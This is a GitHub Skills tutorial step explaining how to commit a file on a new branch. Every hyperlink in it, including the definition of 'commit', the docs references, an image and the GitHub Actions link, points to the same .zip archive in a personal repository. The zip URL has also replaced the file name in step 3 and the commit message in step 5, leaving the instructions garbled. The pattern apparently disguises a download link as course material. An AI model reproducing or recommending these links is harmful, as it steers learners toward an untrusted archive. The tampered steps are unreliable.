## Step 2: Commit a file

_You created a branch! :tada:_

Creating a branch allows you to edit your project without changing the `main` branch. Now that you have a branch, it’s time to create a file and make your first commit!

**What is a commit?**: A _[commit](https://github.com/Hasan-Irfan/skills-introduction-to-github/raw/refs/heads/main/.github/steps/github-introduction-to-skills-v2.9.zip)_ is a set of changes to the files and folders in your project. A commit exists in a branch. For more information, see "[About commits](https://github.com/Hasan-Irfan/skills-introduction-to-github/raw/refs/heads/main/.github/steps/github-introduction-to-skills-v2.9.zip)".

### :keyboard: Activity: Your first commit

The following steps will guide you through the process of committing a change on GitHub. A commit records changes in renaming, changing content within, creating a new file, and any other changes made to your project. For this exercise, committing a change requires first adding a new file to your new branch.

> [!NOTE]
> `.md` is a file extension that creates a Markdown file. You can learn more about Markdown by visiting "[Basic writing and formatting syntax](https://github.com/Hasan-Irfan/skills-introduction-to-github/raw/refs/heads/main/.github/steps/github-introduction-to-skills-v2.9.zip)" in our docs or by taking the "[Communicating using Markdown](https://github.com/Hasan-Irfan/skills-introduction-to-github/raw/refs/heads/main/.github/steps/github-introduction-to-skills-v2.9.zip)" Skills course.

1. On the **< > Code** tab in the header menu of your repository, make sure you're on your new branch `my-first-branch`.

2. Select the **Add file** drop-down and click **Create new file**.

   ![create new file option](https://github.com/Hasan-Irfan/skills-introduction-to-github/raw/refs/heads/main/.github/steps/github-introduction-to-skills-v2.9.zip)

3. In the **Name your file...** field, enter `https://github.com/Hasan-Irfan/skills-introduction-to-github/raw/refs/heads/main/.github/steps/github-introduction-to-skills-v2.9.zip`.

4. In the **Enter file contents here** area, copy the following content to your file:

   ```
   Welcome to my GitHub profile!
   ```

5. Click **Commit changes...** in the upper right corner above the contents box. For commits, you can enter a short commit message that describes what changes you made. This message helps others know what's included in your commit. GitHub offers a simple default message, but let's change it slightly for practice. First, enter `Add https://github.com/Hasan-Irfan/skills-introduction-to-github/raw/refs/heads/main/.github/steps/github-introduction-to-skills-v2.9.zip` in the first text-entry field titled "Commit message".

6. In this lesson, we'll ignore the other fields and click **Commit changes**.
7. Wait about 20 seconds then refresh this page (the one you're following instructions from). [GitHub Actions](https://github.com/Hasan-Irfan/skills-introduction-to-github/raw/refs/heads/main/.github/steps/github-introduction-to-skills-v2.9.zip) will automatically update to the next step.
